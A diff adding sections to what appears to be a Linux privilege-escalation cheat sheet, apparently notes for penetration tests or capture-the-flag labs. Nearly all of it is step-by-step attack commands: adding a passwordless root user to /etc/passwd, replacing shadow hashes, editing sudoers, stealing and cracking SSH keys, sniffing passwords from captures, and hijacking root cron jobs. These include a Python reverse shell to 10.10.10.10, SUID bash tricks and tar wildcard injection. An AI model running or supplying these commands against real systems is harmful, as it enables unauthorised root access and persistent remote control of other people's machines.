@@ -262,6 +262,202 @@ scp -i sshKey groundfloor@192.168.2.105:/keepass/passwordsDB.kdbx .
 - hashed passwords
 - any processes that give you root access after running
 ```
+
+### tcpdump credentials
+```
+tcpdump -nt -r capture.pcap -A 2>/dev/null | grep -P 'pwd='
+```
+### Writable password files
+```
+If you have write permission to the following files:
+
+/etc/passwd
+/etc/shadow
+/etc/sudoers
+
+-----------/etc/passwd-------------------------
+echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd
+su - root2
+id && whoami
+   
+// Add new user to the system with GID and UID of 0   
+   
+OR
+   
+vi /etc/passwd
+Remote X (Password Holder) for root
+wg!
+su root
+id && whoami
+  
+// Remove root's password  
+  
+OR
+
+echo root::0:0:root:/root:/bin/bash > /etc/passwd
+id && whomai
+  
+OR
+
+openssl passwd -1 -salt ignite NewRootPassword
+Copy output
+echo "root2:<output>:0:0:root:/root:/bin/bash" >> /etc/passwd
+Replace <output> with the copied output
+su root2
+id && whoami
+
+------------------/etc/shadow--------------------------------
+
+
+Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
+Copy the output
+vi /etc/shadow
+// Replace root's hash with the output that you generated
+wq!
+su root 
+id && whoami
+   
+/etc/sudoers
+
+echo "<username> ALL=(ALL:ALL) ALL" >> /etc/sudoers // Replace "Username" with your current user (Example: www-data)
+sudo su
+id && whoami
+```
+### SSH Private Keys
+```
+find / -name authorized_keys 2> /dev/null              // Any Public Keys?
+find / -name id_rsa 2> /dev/null                       // Any SSH private keys?
+
+Copy id_rsa contents of keys found with the above command
+Create a local file on your box and paste the content in
+
+chmod 600 <local_file>
+
+ssh -i <local_file> user@IP
+   
+// Is the key password protected?
+
+ssh2john <local_file> > hash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+### Kernel Exploits
+```
+uname -a // What OS kernel are we using?
+
+// Google Search (Example): 4.4.0-116-generic #140-Ubuntu Expliots OR 4.4.0-116-generic #140-Ubuntu PoC github
+// Read the expliots and follow the instructions
+// Popular Linux Kernel Exploits
+
+Dirty COW (CVE-2016-5195)
+URL: https://dirtycow.ninja/
+
+Other Kernel Expliots
+URL: https://github.com/SecWiki/linux-kernel-exploits
+```
+
+### Crontabs
+```
+Enumeration
+
+contab -l
+/etc/init.d
+/etc/cron*
+/etc/crontab
+/etc/cron.allow
+/etc/cron.d 
+/etc/cron.deny
+/etc/cron.daily
+/etc/cron.hourly
+/etc/cron.monthly
+/etc/cron.weekly
+
+Example 1
+
+Privilege Escalation via Nonexistent File Overwrite
+
+cat /etc/crontab
+Output Example: * * * * * root systemupdate.sh
+echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
+chmod +x /home/user/systemupdate.sh
+Wait a while
+/bin/bash -p
+id && whoami
+
+Example 2
+
+Privilege Escalation via Root Executable Bash Script
+
+cat /etc/crontab
+Output Example: * * * * * root /usr/bin/local/network-test.sh
+echo "chmod +s /bin/bash" >> /usr/bin/local/network-test.sh
+Wait a while
+id && whomai
+
+Example 3
+
+Privilege Escalation via Root Executable Python Script Overwrite
+
+Target
+
+cat /etc/crontab
+Output Example: * * * * * root /var/www/html/web-backup.py
+cd /var/www/html/
+vi web-backup.py
+Add the below to the script:
+
+import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.10.10",443)); 
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/bash","-i"]);
+
+// Replace the IP & Port 
+
+// Save & Exit the Script
+Attacker
+
+nc -lvnp 443
+OR
+
+Target
+
+cat /etc/crontab
+Output Example: * * * * * root /var/www/html/web-backup.py
+cd /var/www/html/
+vi web-backup.py
+Add the below to the script:
+
+import os
+
+os.system("chmod +s /bin/bash")
+
+// Save & Exit the Script
+
+Wait a While
+/bin/bash -p
+id && whoami
+
+Example 5
+
+Privilege Escalation via Tar Cron Job
+
+cat /etc/crontab
+Output Example: */1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*
+cd /var/www/html/
+echo "chmod +s /bin/bash" > priv.sh
+echo "" > "--checkpoint-action=exec=bash priv.sh
+echo "" > --checkpoint=1
+tar cf archive.tar *
+
+// If it does not work , replace "bash" with "sh"
+```
+
 ### Escalate priv by adding /bin/bash to script for a user (need pass or sudo permission)
 ```
 sudo -u user /bin/bash /var/www/html/start.sh
